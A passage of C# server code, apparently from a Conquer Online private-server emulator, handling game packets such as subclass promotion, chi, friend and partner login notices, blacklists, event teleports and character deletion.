                                    if (client.Entity.SubClasses.StudyPoints >= required)
                                    {
                                        client.Entity.SubClasses.StudyPoints -= required;
                                        subClass2.Level++;
                                        Database.SubClassTable.Update(client.Entity, subClass2);
                                        SubClassShow subClassShow3 = new SubClassShow(0);
                                        subClassShow3.ID = SubClassShow.SendUpdate;
                                        subClassShow3.Class = subClass2.ID;
                                        client.Send(subClassShow3.ToArray());
                                        client.Entity.SubClasses.Send(client);
                                        break;
                                    }
                                    client.LoadItemStats();
                                    break;
                                }
                            case SubClassShow.Open:
                                client.Entity.SubClasses.Send(client);
                                break;
                            case SubClassShow.Join:
                                {
                                    if (sclass > 9)
                                        break;

                                    uint ItemID = SubClassShow.ItemsPromote[sclass];
                                    byte amount = SubClassShow.ItemsCount[sclass];

                                    if (client.Inventory.Contains(ItemID, amount))
                                    {
                                        if (!client.Entity.SubClasses.Classes.ContainsKey(sclass) && client.Inventory.Remove(ItemID, amount))
                                        {
                                            Game.SubClass subClass3 = new Game.SubClass();
                                            subClass3.ID = sclass;
                                            subClass3.Phase = 1;
                                            subClass3.Level = 1;
                                            client.Entity.SubClasses.Classes.Add(subClass3.ID, subClass3);
                                            client.Entity.SubClasses.SendLearn((ClassID)subClass3.ID, subClass3.Level, client);
                                            MTA.Database.SubClassTable.Insert(client.Entity, subClass3.ID);

                                        }
                                    }
                                    client.LoadItemStats();
                                    break;
                                }
                            case SubClassShow.Pro:
                                {
                                    if (!client.Entity.SubClasses.Classes.ContainsKey(sclass))
                                        return;

                                    Game.SubClass subClass10 = client.Entity.SubClasses.Classes[sclass];
                                    if (subClass10.Phase == 9)
                                        return;

                                    if (subClass10.Phase < subClass10.Level)
                                    {
                                        if (subClass10.ID == 6)
                                        {
                                            if (subClass10.Phase == 3)
                                                client.AddSpell(new Spell(true)
                                                {
                                                    ID = 1416
                                                });

                                            if (subClass10.Phase == 5)
                                                client.AddSpell(new Spell(true)
                                                {
                                                    ID = 1417
                                                });

                                            if (subClass10.Phase == 7)
                                                client.AddSpell(new Spell(true)
                                                {
                                                    ID = 1418
                                                });
                                            if (subClass10.Phase == 9)
                                                client.AddSpell(new Spell(true)
                                                {
                                                    ID = 1419
                                                });
                                        }
                                        subClass10.Phase++;
                                        client.Entity.SubClasses.UpgradeStatus(client, true);
                                        MTA.Database.SubClassTable.Update(client.Entity, subClass10);
                                        client.Entity.SubClasses.SendPromoted((ClassID)subClass10.ID, subClass10.Phase, client);
                                        break;
                                    }
                                    break;
                                }

                        }
                        client.LoadItemStats();
                        break;
                    }

                #endregion
                #region ItemAdding Stabilization
                case 1038:
                    {
                        ItemAddingStabilization stabilization = new ItemAddingStabilization(false);
                        stabilization.Deserialize(packet);
                        switch (packet[4])
                        {
                            case 1:
                                {
                                    StabilazeArtifact(stabilization, client);
                                    break;
                                }
                            case 0:
                                {
                                    StabilazeRefinery(stabilization, client);
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region Data (10010)
                case 10010:
                    {
                        if (client.Action != 2)
                            return;
                        HandleData(client, packet);
                        break;
                    }
                #endregion
                #region TimePacket (1033)
                case 1033:
                    {
                        ServerTime time = new ServerTime();
                        time.Year = (uint)DateTime.Now.Year;
                        time.Month = (uint)DateTime.Now.Month;
                        time.DayOfYear = (uint)DateTime.Now.DayOfYear;
                        time.DayOfMonth = (uint)DateTime.Now.Day;
                        time.Hour = (uint)DateTime.Now.Hour;
                        time.Minute = (uint)DateTime.Now.Minute;
                        time.Second = (uint)DateTime.Now.Second;
                        client.Send(time);
                        break;
                    }
                #endregion
                #region Chi (2533)
                case 2533:
                    {
                        Chi chi = new Chi(false);
                        chi.Deserialize(packet);
                        switch (chi.Type)
                        {
                            case Chi.Unlock:
                                UnlockChi(chi, client);
                                break;
                            case Chi.QueryInfo:
                                QueryChi(chi, client);
                                break;
                            case Chi.Study:
                                StudyChi(chi, client);
                                break;
                            case Chi.BuyStrength:
                                BuyStrengthChi(chi, client);
                                break;
                        }
                        break;
                    }
                #endregion
                #region Chi retreat (2536)
                case 2536:
                    {
                        MaTrix.RetreatChi.Retreat(packet, client);
                        break;
                    }
                #endregion Chi retreat (2536)
                default:
                    {
                        if (client.Account.State == MTA.Database.AccountTable.AccountState.GM)
                            client.Send(new Message("Unknown type: " + ID + " with length " + packet.Length, System.Drawing.Color.CadetBlue, Message.Talk));
                        //if (ID == 1040)
                        //    client.Send(packet);
                        break;
                    }
            }
        }
        private static void HandleData(GameState client, byte[] packet)
        {
            Data gData = new Data(false);
            gData.Deserialize(packet);
            switch (gData.ID)
            {
                case 256:
                    {
                        if (client.SashSlots < 200)
                        {
                            if (client.Entity.ConquerPoints >= 90)
                            {
                                client.Entity.ConquerPoints -= 90;
                                client.SashSlots += 1;
                            }
                            else
                            {
                                client.Entity.SendSysMesage("make sure you Have 90 CPs");
                            }
                        }
                        else
                        {
                            client.Entity.SendSysMesage("you already opened max number of slots");
                        }
                        break;
                    }
                case 255:
                    {
                        //PrintPacket(packet);
                        gData.UID = client.Entity.UID;
                        gData.ID = 257;
                        client.Send(gData);
                        break;
                    }
                case Data.DetainWindowRequest:
                    {
                        if (!client.JustOpenedDetain)
                        {
                            if (client.DeatinedItem.Count != 0)
                                client.Send(new Data(true) { ID = Data.OpenWindow, dwParam = Data.WindowCommands.DetainRedeem, UID = client.Entity.UID });
                            if (client.ClaimableItem.Count != 0)
                                client.Send(new Data(true) { ID = Data.OpenWindow, dwParam = Data.WindowCommands.DetainClaim, UID = client.Entity.UID });
                        }

                        client.JustOpenedDetain = !client.JustOpenedDetain;
                        break;
                    }
                    //case Data.FinishSteedRace:
                    if (client.Entity.MapID == SteedRace.MAPID)
                        //Program.World.SteedRace.FinishRace(client);
                        break;
                case 440://AddPersonToBlackList
                    {
                        var targetname = System.Text.UnicodeEncoding.UTF8.GetString(packet, 43, packet[42]).Replace("/0", "");
                        foreach (var person in Kernel.GamePool.Values)
                        {
                            if (person.Entity.Name == targetname)
                            {
                                if (!client.Entity.BlackList.Contains(targetname))
                                {
                                    client.Entity.BlackList.Add(targetname);
                                    gData.Unknown2 = 1;
                                    gData.dwParam = 1;
                                    gData.UID = client.Entity.UID;
                                    gData.TimeStamp = Time32.Now;
                                    gData.ID = 440;

                                    gData.Send(client);

                                }
                            }
                        }
                        break;
                    }
                case 441://RemovePersonFromBlackList
                    {
                        var targetname = System.Text.UnicodeEncoding.UTF8.GetString(packet, 43, packet[42]).Replace("/0", "");
                        if (client.Entity.BlackList.Contains(targetname))
                        {
                            client.Entity.BlackList.Remove(targetname);
                            gData.Unknown2 = 1;
                            gData.dwParam = 1;
                            gData.UID = client.Entity.UID;
                            gData.TimeStamp = Time32.Now;
                            gData.ID = 441;

                            gData.Send(client);
                        }
                        break;
                    }
                case 408:
                    {
                        if (!client.JustOpenedDetain)
                            if (client.ClaimableItem.Count != 0)
                                client.Send(new Data(true) { ID = Data.OpenWindow, dwParam = Data.WindowCommands.DetainClaim, UID = client.Entity.UID });
                        client.JustOpenedDetain = !client.JustOpenedDetain;
                        break;
                    }
                case 132:
                    {
                        client.Disconnect();
                        break;
                    }
                case Data.AppearanceType:
                    ChangeAppearance(gData, client);
                    break;
                case Data.LevelUpSpell:
                    LevelUpSpell(gData, client);
                    break;
                case Data.LevelUpProficiency:
                    LevelUpProficiency(gData, client);
                    break;
                case Data.SwingPickaxe:
                    client.Mining = true;
                    break;
                case Data.Revive:
                    Revive(gData, client);
                    break;
                case Data.UsePortal:
                    UsePortal(gData, client);
                    break;
                case Data.ChangePKMode:
                    ChangePKMode(gData, client);
                    break;
                case Data.ChangeAction:
                    ChangeAction(gData, client);
                    break;
                case Data.ChangeDirection:
                    ChangeDirection(gData, client);
                    break;
                case Data.Hotkeys:
                    client.Send(packet);
                    break;
                case Data.ConfirmSpells:
                    if (client.Spells != null)
                        foreach (Interfaces.ISkill spell in client.Spells.Values)
                            if (spell.ID != 3060)
                                spell.Send(client);
                    client.Send(packet);
                    break;
                case Data.ConfirmProficiencies:
                    if (client.Proficiencies != null)
                        foreach (Interfaces.IProf proficiency in client.Proficiencies.Values)
                            proficiency.Send(client);
                    client.Send(packet);
                    break;
                case Data.ConfirmGuild:
                    client.Send(packet);
                    break;
                case Data.Bulletin:
                    {
                        if (DateTime.Now.DayOfWeek == DayOfWeek.Wednesday && DateTime.Now.Hour ==
                            19 && DateTime.Now.Minute == 45 && DateTime.Now.Minute <= 50)//skill team pk                                   
                        {
                            client.Entity.Teleport(1002, 313, 143);//Teleport 
                        }
                        else if (DateTime.Now.DayOfWeek == DayOfWeek.Friday && DateTime.Now.Hour == 19
                        && DateTime.Now.Minute == 55 && DateTime.Now.Minute <= 59)//elite pk                                      
                        {
                            client.Entity.Teleport(1002, 302, 144);//Teleport 
                        }
                        else if (DateTime.Now.DayOfWeek == DayOfWeek.Saturday && DateTime.Now.Hour ==
                            18 && DateTime.Now.Minute == 45 && DateTime.Now.Minute <= 50)//team pk                                             
                        {
                            client.Entity.Teleport(1002, 292, 146);//Teleport 
                        }
                        else if (DateTime.Now.Day <= 7 && DateTime.Now.DayOfWeek == DayOfWeek.Sunday &&
                            DateTime.Now.Hour == 22 && DateTime.Now.Minute >= 01 && DateTime.Now.Minute <= 14)//Monthly PK                                                                                  
                        {
                            client.Entity.Teleport(1002, 324, 194);//Teleport 
                        }
                        else if (DateTime.Now.DayOfWeek == DayOfWeek.Sunday &&
                            DateTime.Now.Hour == 20 && DateTime.Now.Minute >= 05 && DateTime.Now.Minute <= 15)// Weekly PK                                          
                        {
                            client.Entity.Teleport(1002, 324, 194);//Teleport 
                        }
                        if (DateTime.Now.DayOfWeek == DayOfWeek.Saturday && DateTime.Now.Hour ==
                             21 && DateTime.Now.Minute == 36 && DateTime.Now.Minute <= 59)//CaptureTheFlag                             
                        {
                            client.Entity.Teleport(1002, 225, 237);//Teleport 
                        }
                        else if (DateTime.Now.DayOfWeek == DayOfWeek.Wednesday || DateTime.Now.DayOfWeek ==
                            DayOfWeek.Friday) if ((DateTime.Now.Hour == 12 || DateTime.Now.Hour == 19) && DateTime.Now.Minute ==
                                 01 && DateTime.Now.Minute <= 05)//Dis City 
                            {
                                client.Entity.Teleport(1002, 297, 149);//Teleport 
                            }
                        break;
                    }
                case Data.ConfirmFriends:
                    #region Friends/Enemy/TradePartners/Apprentices
                    Message msg2 = new Message("Your friend, " + client.Entity.Name + ", has logged on.", System.Drawing.Color.Red, Message.TopLeft);

                    foreach (Game.ConquerStructures.Society.Friend friend in client.Friends.Values)
                    {
                        if (friend.IsOnline)
                        {
                            var pckt = new KnownPersons(true)
                            {
                                UID = client.Entity.UID,
                                Type = KnownPersons.RemovePerson,
                                Name = client.Entity.Name,
                                NobilityRank = client.Entity.NobilityRank,
                                IsBoy = PacketHandler.IsBoy(client.Entity.Body),
                                Online = true
                            };
                            friend.Client.Send(pckt);
                            pckt.Type = KnownPersons.AddFriend;
                            friend.Client.Send(pckt);
                            friend.Client.Send(msg2);
                        }
                        client.Send(new KnownPersons(true)
                        {
                            UID = friend.ID,
                            Type = KnownPersons.AddFriend,
                            Name = friend.Name,
                            NobilityRank = friend.NobilityRank,
                            IsBoy = friend.IsBoy,
                            Online = friend.IsOnline
                        });
                        if (friend.Message != "")
                        {
                            client.Send(new Message(friend.Message, client.Entity.Name, friend.Name, System.Drawing.Color.Red, Message.Whisper));
                            Database.KnownPersons.UpdateMessageOnFriend(friend.ID, client.Entity.UID, "");
                        }
                    }

                    foreach (Game.ConquerStructures.Society.Enemy enemy in client.Enemy.Values)
                    {
                        client.Send(new KnownPersons(true)
                        {
                            UID = enemy.ID,
                            Type = KnownPersons.AddEnemy,
                            Name = enemy.Name,
                            NobilityRank = enemy.NobilityRank,
                            IsBoy = enemy.IsBoy,
                            Online = enemy.IsOnline
                        });
                    }
                    Message msg3 = new Message("Your partner, " + client.Entity.Name + ", has logged in.", System.Drawing.Color.Red, Message.TopLeft);

                    foreach (Game.ConquerStructures.Society.TradePartner partner in client.Partners.Values)
                    {
                        if (partner.IsOnline)
                        {
                            var packet3 = new TradePartner(true)
                            {
                                UID = client.Entity.UID,
                                Type = TradePartner.BreakPartnership,
                                Name = client.Entity.Name,
                                HoursLeft = (int)(new TimeSpan(partner.ProbationStartedOn.AddDays(3).Ticks).TotalHours - new TimeSpan(DateTime.Now.Ticks).TotalHours),
                                Online = true
                            };
                            partner.Client.Send(packet3);
                            packet3.Type = TradePartner.AddPartner;
                            partner.Client.Send(packet3);
                            partner.Client.Send(msg3);
                        }
                        var packet4 = new TradePartner(true)
                        {
                            UID = partner.ID,
                            Type = TradePartner.AddPartner,
                            Name = partner.Name,
                            HoursLeft = (int)(new TimeSpan(partner.ProbationStartedOn.AddDays(3).Ticks).TotalHours - new TimeSpan(DateTime.Now.Ticks).TotalHours),
                            Online = partner.IsOnline
                        };
                        client.Send(packet4);
                    }

                    foreach (Game.ConquerStructures.Society.Apprentice appr in client.Apprentices.Values)
                    {
                        if (appr.IsOnline)
                        {
                            ApprenticeInformation AppInfo = new ApprenticeInformation();
                            AppInfo.Apprentice_ID = appr.ID;
                            AppInfo.Apprentice_Level = appr.Client.Entity.Level;
                            AppInfo.Apprentice_Class = appr.Client.Entity.Class;
                            AppInfo.Apprentice_PkPoints = appr.Client.Entity.PKPoints;
                            AppInfo.Apprentice_Experience = appr.Actual_Experience;
                            AppInfo.Apprentice_Composing = appr.Actual_Plus;
                            AppInfo.Apprentice_Blessing = appr.Actual_HeavenBlessing;
                            AppInfo.Apprentice_Name = appr.Name;
                            AppInfo.Apprentice_Online = true;
                            AppInfo.Apprentice_Spouse_Name = appr.Client.Entity.Spouse;
                            AppInfo.Enrole_date = appr.EnroleDate;
                            AppInfo.Mentor_ID = client.Entity.UID;
                            AppInfo.Mentor_Mesh = client.Entity.Mesh;
                            AppInfo.Mentor_Name = client.Entity.Name;
                            AppInfo.Type = 2;
                            client.Send(AppInfo);

                            MentorInformation Information = new MentorInformation(true);
                            Information.Mentor_Type = 1;
                            Information.Mentor_ID = client.Entity.UID;
                            Information.Apprentice_ID = appr.ID;
                            Information.Enrole_Date = appr.EnroleDate;
                            Information.Mentor_Level = client.Entity.Level;
                            Information.Mentor_Class = client.Entity.Class;
                            Information.Mentor_PkPoints = client.Entity.PKPoints;
                            Information.Mentor_Mesh = client.Entity.Mesh;
                            Information.Mentor_Online = true;
                            Information.Shared_Battle_Power = appr.Client.Entity.BattlePowerFrom(client.Entity);
                            Information.String_Count = 3;
                            Information.Mentor_Name = client.Entity.Name;
                            Information.Apprentice_Name = appr.Name;
                            Information.Mentor_Spouse_Name = client.Entity.Spouse;
                            appr.Client.ReviewMentor();
                            appr.Client.Send(Information);
                        }
                        else
                        {
                            ApprenticeInformation AppInfo = new ApprenticeInformation();
                            AppInfo.Apprentice_ID = appr.ID;
                            AppInfo.Apprentice_Name = appr.Name;
                            AppInfo.Apprentice_Online = false;
                            AppInfo.Enrole_date = appr.EnroleDate;
                            AppInfo.Mentor_ID = client.Entity.UID;
                            AppInfo.Mentor_Mesh = client.Entity.Mesh;
                            AppInfo.Mentor_Name = client.Entity.Name;
                            AppInfo.Type = 2;
                            client.Send(AppInfo);
                        }
                    }
                    #endregion
                    client.Send(packet);
                    break;
                case Data.EndTeleport:
                    break;
                case Data.GetSurroundings:
                    if (client.Booth != null)
                    {
                        client.Entity.TransformationID = 0;
                        client.Booth.Remove();
                        client.Booth = null;
                    }
                    GetSurroundings(client);
                    if (client.ChampionGroup != null)
                    {
                        byte[] p5442 = new byte[] { 20, 0, 86, 4, 40, 128, 14, 0, 160, 187, 13, 0, 103, 0, 21, 64, 12, 49, 0, 0, 84, 81, 83, 101, 114, 118, 101, 114 };
                        client.Send(p5442);
                    }
                    else
                        client.Send(new MapStatus() { BaseID = client.Map.BaseID, ID = client.Map.ID, Status = Database.MapsTable.MapInformations[client.Map.ID].Status, Weather = Database.MapsTable.MapInformations[client.Map.ID].Weather });
                    Game.Weather.CurrentWeatherBase.Send(client);
                    client.Send(gData);
                    break;
                case Data.SetLocation:
                    if (client._setlocation)
                        SetLocation(gData, client);
                    break;
                case Data.Jump:
                    client.Entity.SetAway(false);
                    client.LastMove = Time32.Now;
                    PlayerJump(gData, client);
                    client.Entity.SpellStamp = Time32.Now.AddSeconds(-1);
                    break;
                case Data.UnknownEntity:
                    {
                        #region UnknownEntity
                        Client.GameState pClient = null;
                        if (Kernel.GamePool.TryGetValue(gData.dwParam, out pClient))
                        {
                            if (Kernel.GetDistance(pClient.Entity.X, pClient.Entity.Y, client.Entity.X, client.Entity.Y) <= Constants.pScreenDistance && client.Map.ID == pClient.Map.ID)
                            {
                                if (pClient.Guild != null)
                                    pClient.Guild.SendName(client);
                                if (client.Guild != null)
                                    client.Guild.SendName(pClient);
                                if (pClient.Entity.UID != client.Entity.UID)
                                {
                                    if (pClient.Map.ID == client.Map.ID)
                                    {
                                        if (pClient.Map.BaseID == 700 && pClient.Map.ID != 700)
                                        {
                                            if (client.InQualifier())
                                            {
                                                if (pClient.InQualifier())
                                                {
                                                    client.Entity.SendSpawn(pClient);
                                                    pClient.Entity.SendSpawn(client);
                                                    if (pClient.Guild != null)
                                                        client.Entity.SendSpawn(pClient, false);
                                                    if (client.Guild != null)
                                                        pClient.Entity.SendSpawn(client, false);
                                                }
                                                else
                                                {
                                                    client.Entity.SendSpawn(pClient);

                                                    if (pClient.Guild != null)
                                                        client.Entity.SendSpawn(pClient, false);
                                                    client.Screen.Add(pClient.Entity);
                                                }
                                            }
                                            else
                                            {
                                                if (pClient.InQualifier())
                                                {
                                                    pClient.Entity.SendSpawn(client);
                                                    if (client.Guild != null)
                                                        pClient.Entity.SendSpawn(client, false);
                                                    pClient.Screen.Add(client.Entity);
                                                }
                                                else
                                                {
                                                    client.Entity.SendSpawn(pClient, false);
                                                    pClient.Entity.SendSpawn(client, false);
                                                }
                                            }
                                        }
                                        else
                                        {
                                            client.Entity.SendSpawn(pClient, false);
                                            pClient.Entity.SendSpawn(client, false);
                                        }
                                    }
                                }
                            }
                        }
                        else
                        {
                            Game.Entity monster = null;
                            if (client.Map.Entities.TryGetValue(gData.dwParam, out monster))
                            {
                                if (Kernel.GetDistance(monster.X, monster.Y, client.Entity.X, client.Entity.Y) <= Constants.pScreenDistance)
                                {
                                    monster.SendSpawn(client, false);
                                }
                            }
                            //if (client.Map.Companions.TryGetValue(gData.dwParam, out monster))
                            //{
                            //    if (Kernel.GetDistance(monster.X, monster.Y, client.Entity.X, client.Entity.Y) <= Constants.pScreenDistance)
                            //    {
                            //        monster.SendSpawn(client, false);
                            //    }
                            //}
                        }
                        #endregion
                        break;
                    }
                case Data.CompleteLogin:
                    {
                        LoginMessages(client);
                        ClientEquip equips = new ClientEquip();
                        equips.DoEquips(client);
                        client.Send(equips);
                        client.Send(packet);
                        break;
                    }
                case Data.ChangeFace:
                    ChangeFace(gData, client);
                    break;
                case Data.ObserveEquipment:
                case Data.ObserveEquipment2:
                case Data.ObserveKnownPerson:
                    ObserveEquipment(gData, client);
                    break;
                case Data.ViewEnemyInfo:
                    {
                        if (client.Enemy.ContainsKey(gData.dwParam))
                        {
                            if (client.Enemy[gData.dwParam].IsOnline)
                            {
                                KnownPersonInfo info = new KnownPersonInfo(true);
                                info.Fill(client.Enemy[gData.dwParam], true, false);
                                if (client.Enemy[gData.dwParam].Client.Guild != null)
                                    client.Enemy[gData.dwParam].Client.Guild.SendName(client);
                                client.Send(info);
                            }
                        }
                        break;
                    }
                case Data.ViewFriendInfo:
                    {
                        if (client.Friends.ContainsKey(gData.dwParam))
                        {
                            if (client.Friends[gData.dwParam].IsOnline)
                            {
                                KnownPersonInfo info = new KnownPersonInfo(true);
                                info.Fill(client.Friends[gData.dwParam], false, false);
                                if (client.Friends[gData.dwParam].Client.Guild != null)
                                    client.Friends[gData.dwParam].Client.Guild.SendName(client);
                                client.Send(info);
                            }
                        }
                        break;
                    }
                case Data.ViewPartnerInfo:
                    {
                        if (client.Partners.ContainsKey(gData.dwParam))
                        {
                            if (client.Partners[gData.dwParam].IsOnline)
                            {
                                TradePartnerInfo info = new TradePartnerInfo(true);
                                info.Fill(client.Partners[gData.dwParam]);
                                if (client.Partners[gData.dwParam].Client.Guild != null)
                                    client.Partners[gData.dwParam].Client.Guild.SendName(client);
                                client.Send(info);
                            }
                        }
                        break;
                    }
                case Data.EndFly:
                    client.Entity.RemoveFlag(Update.Flags.Fly);
                    break;
                case Data.EndTransformation:
                    client.Entity.Untransform();
                    break;
                case Data.XPListEnd:
                case Data.Die:
                    break;
                case Data.OwnBooth:
                    {
                        //client.Entity.TransformationTime = 3600;
                        //client.Entity.TransformationID = client.VendingDisguise;
                        //client.Entity.TransformationStamp = Time32.Now.AddDays(1);
                        //client.Entity.Update(Update.MaxHitpoints, client.Entity.MaxHitpoints, false);
                        client.Booth = new MTA.Game.ConquerStructures.Booth(client, gData);
                        client.Send(new Data(true) { ID = Data.ChangeAction, UID = client.Entity.UID, dwParam = 0 });
                        break;
                    }
                case Data.Away:
                    {
                        //  client.Entity.SetAway(packet[8] == 1);
                        //  client.SendScreen(gData, true);
                        if (client.Entity.Away == 0)
                        {
                            client.Entity.Away = 1;
                        }
                        else
                        {
                            client.Entity.Away = 0;
                        }
                        client.SendScreenSpawn(client.Entity, false);
                        break;
                    }
                case Data.PokerTournament:
                    {
                        if (client != null && client.Entity.MapID < 10000 && !client.Entity.Dead && client.Entity != null && !client.Entity.InJail() && !client.InQualifier() && !client.InTeamQualifier() && !client.IsWatching() && client.Booth == null && !Constants.PKFreeMaps.Contains(client.Entity.MapID))
                        {
                            switch (packet[12])
                            {
                                case 1:
                                    client.Entity.Teleport(1858, 89, 92);
                                    break;
                                case 2:
                                    client.Entity.Teleport(8881, 57, 63);
                                    break;
                                case 4:
                                    client.Entity.Teleport(2807, 57, 66);
                                    break;
                                case 3:
                                    client.Entity.Teleport(1036, 239, 240);
                                    break;
                            }
                        }
                        break;
                    }
                case Data.DeleteCharacter:
                    {
                        if ((client.WarehousePW == 0 || client.WarehousePW == 0 && gData.dwParam == 0) || (client.WarehousePW == gData.dwParam))
                        {
                            Database.MySqlCommand cmd = new Database.MySqlCommand(Database.MySqlCommandType.SELECT).Select("entities").Where("UID", client.Entity.UID);//debug and test!
                            Database.MySqlReader reader = new Database.MySqlReader(cmd);
                            if (!reader.Read())//wait
                            {
                                Database.MySqlCommand cmd2 = new Database.MySqlCommand(Database.MySqlCommandType.DELETE);
                                cmd2.Delete("entities", "Name", client.Entity.Name).Where("UID", client.Entity.UID).Execute();
                            }
                            client.Account.EntityID = 0;
                            client.Account.Save();
                            client.Disconnect();
                        }
                        break;
                    }
                case Data.TeamSearchForMember:
                    {
                        if (client.Team != null)
                        {
                            Client.GameState Client = null;
                            if (!client.Team.IsTeammate(gData.UID))
                                return;
                            if (Kernel.GamePool.TryGetValue(gData.UID, out Client))
                            {
                                gData.wParam1 = Client.Entity.X;
                                gData.wParam2 = Client.Entity.Y;
                                gData.Send(client);
                            }
                        }
                        break;
                    }
                default:
                    if (client.Account.State == MTA.Database.AccountTable.AccountState.GM)
                        client.Send(new Message("Unknown generaldata id: " + gData.ID, System.Drawing.Color.CadetBlue, Message.Talk));
                    break;
            }
        }

        public static void PrintPacket(byte[] packet)
        {
            ushort Length = BitConverter.ToUInt16(packet, 0);
            ushort ID = BitConverter.ToUInt16(packet, 2);
            System.Console.Write("Packet ID : [{0}] , Lenght : [{1}] \n\n", ID, Length);
            foreach (byte D in packet)
            {
                System.Console.Write((Convert.ToString(D, 16)).PadLeft(2, '0') + " ");
            }
            System.Console.Write("\n\n");
        }

        public static bool PassLearn(byte ID, Game.Entity Entity)
        {
            Boolean Pass = false;
            uint id = 0;
            uint count = 0;
            switch ((Game.ClassID)ID)
            {
                case Game.ClassID.MartialArtist:
                    if (Entity.Owner.Inventory.Contains(721259, 5))
                    {
                        Entity.Owner.Inventory.Remove(721259, 5);
                        Pass = true;
                    }
                    else
                    {
                        id = 521259;
                        count = 5;
                    }
                    break;
                case Game.ClassID.Warlock:
                    if (Entity.Owner.Inventory.Contains(721261, 10))
                    {
                        Entity.Owner.Inventory.Remove(721261, 10);
                        Pass = true;
                    }
                    else
                    {
                        id = 721261;
                        count = 10;
                    }
                    break;
                case Game.ClassID.ChiMaster:
                    if (Entity.Owner.Inventory.Contains(711188, 1))
                    {
                        Entity.Owner.Inventory.Remove(711188, 1);
                        Pass = true;
                    }
                    else
                    {
                        id = 711188;
                        count = 1;
                    }
                    break;
                case Game.ClassID.Sage:
                    if (Entity.Owner.Inventory.Contains(723087, 20))
                    {
                        Entity.Owner.Inventory.Remove(723087, 20);
                        Pass = true;
                    }
                    else
                    {
                        id = 723087;
                        count = 20;
                    }
                    break;
                case Game.ClassID.Apothecary:
                    if (Entity.Owner.Inventory.Contains(1088001, 10))
                    {
                        Entity.Owner.Inventory.Remove(1088001, 10);
                        Pass = true;
                    }
                    else
                    {
                        id = 1088001;
                        count = 10;
                    }
                    break;
                case Game.ClassID.Performer:
                    if (Entity.Owner.Inventory.Contains(711679, 1))
                    {
                        Entity.Owner.Inventory.Remove(711679, 1);
                        Pass = true;
                    }
                    else
                    {
                        id = 711679;
                        count = 1;
                    }
                    break;
                case Game.ClassID.Wrangler:
                    if (Entity.Owner.Inventory.Contains(723903, 40))
                    {
                        Entity.Owner.Inventory.Remove(723903, 40);
                        Pass = true;
                    }
                    else
                    {
                        id = 723903;
                        count = 40;
                    }
                    break;
            }
            if (!Pass)
            {
                if (Database.ConquerItemInformation.BaseInformations.ContainsKey(id))
                {
                    Entity.Owner.MessageBox("You Need " + count + Database.ConquerItemInformation.BaseInformations[id].Name);
                }
            }
            return Pass;
        }
        public static bool PassRequeriments(Game.SubClass Sc, Game.Entity Entity)
        {
            Boolean Pass = false;
            byte Level = 0;
            byte Reborns = 0;
            #region [Switch Phases]
            switch (Sc.Phase)
            {
                case 0:
                case 1: return true;
                case 2: Level = 90; Reborns = 0; break;
                case 3: Level = 110; Reborns = 0; break;
                case 4: Level = 120; Reborns = 0; break;
                case 5: Level = 90; Reborns = 0; break;
                case 6: Level = 110; Reborns = 0; break;
                case 7: Level = 120; Reborns = 0; break;
                case 8: Level = 120; Reborns = 0; break;
                case 9: Level = 120; Reborns = 0; break;
            }
            #endregion

            if (Sc.Level > Sc.Phase && Entity.Level >= Level && Entity.Reborn >= Reborns)
                Pass = true;

            if (Sc.Level == 9 && Sc.Phase == 9)
                Pass = false;

            return Pass;
        }
        public static void ChangeAppearance(Data generalData, GameState client)
        {
            if (client.Entity.Tournament_Signed)
                return;
            generalData.UID = client.Entity.UID;
            client.Entity.Appearance = (Game.AppearanceType)generalData.dwParam;
            client.Appearance = (uint)client.Entity.Appearance;
            client.SendScreen(generalData, true);
        }

        public static void ChangeAppearance(GameState client, AppearanceType Type)
        {
            if (client.Entity.Tournament_Signed)
                return;
            Data generalData = new GamePackets.Data(true);
            generalData.UID = client.Entity.UID;
            generalData.ID = Data.AppearanceType;
            generalData.dwParam = (uint)Type;
            client.Entity.Appearance = Type;
            client.SendScreen(generalData, true);
        }

        private static void SendChiRankings(GenericRanking ranking, GameState client)
        {
            SendRankingQuery(ranking, client, GenericRanking.DragonChi, (uint)client.ChiData.DragonRank, (uint)client.ChiData.DragonPoints);
            SendRankingQuery(ranking, client, GenericRanking.PhoenixChi, (uint)client.ChiData.PhoenixRank, (uint)client.ChiData.PhoenixPoints);
            SendRankingQuery(ranking, client, GenericRanking.TigerChi, (uint)client.ChiData.TigerRank, (uint)client.ChiData.TigerPoints);
            SendRankingQuery(ranking, client, GenericRanking.TurtleChi, (uint)client.ChiData.TurtleRank, (uint)client.ChiData.TurtlePoints);
        }

        public static void SendRankingQuery(GenericRanking ranking, GameState client, uint type, uint rank, uint points)
        {
            if (rank != 0)
            {
                ranking.RankingType = type;
                ranking.Append(rank, points, client.Entity.UID, client.Entity.Name);
                client.Send(ranking);
                ranking.Reset();
            }
        }
        public static bool PassJoinRequirements(Client.GameState client, Game.ConquerStructures.Society.Guild guild)
        {
            GuildCommand cmd = new GuildCommand(true);
            cmd.Type = GuildCommand.GuildRequirements;
            cmd.dwParam2 = guild.LevelRequirement;
            cmd.dwParam3 = guild.RebornRequirement;
            cmd.dwParam4 = guild.ClassRequirement;
            if (((client.Entity.Class >= 10 && client.Entity.Class <= 15) && !guild.AllowTrojans) ||
                ((client.Entity.Class >= 20 && client.Entity.Class <= 25) && !guild.AllowWarriors) ||
                ((client.Entity.Class >= 40 && client.Entity.Class <= 45) && !guild.AllowArchers) ||
                ((client.Entity.Class >= 50 && client.Entity.Class <= 55) && !guild.AllowNinjas) ||
                ((client.Entity.Class >= 60 && client.Entity.Class <= 65) && !guild.AllowMonks) ||
                ((client.Entity.Class >= 70 && client.Entity.Class <= 75) && !guild.AllowPirates) ||
                ((client.Entity.Class >= 100 && client.Entity.Class <= 190) && !guild.AllowTaoists))
            {
                client.Send(cmd);
                return false;
            }
            if (client.Entity.Reborn < guild.RebornRequirement)
            {
                client.Send(cmd);
                return false;
            }
            if (client.Entity.Level < guild.LevelRequirement)
            {
                client.Send(cmd);
                return false;
            }
            return true;
        }
        private static bool SwitchEquipment(GameState client, bool toAlternative)
        {
            if (client.Entity.ContainsFlag(Update.Flags.Fly))
            {
                client.Send(new Message("You cannot switch equipment during flight.", System.Drawing.Color.Red, Message.Talk));
                return false;
            }
            if (client.Equipment.Free(ConquerItem.AlternateRightWeapon) && !client.Equipment.Free(ConquerItem.AlternateLeftWeapon))
            {
                client.Send(new Message("Invalid weapons! Missing the important weapons? Unequip the alternative left weapon.", System.Drawing.Color.Red, Message.Talk));
                return false;
            }
            foreach (var eq in client.Equipment.Objects)
            {
                if (eq != null)
                {
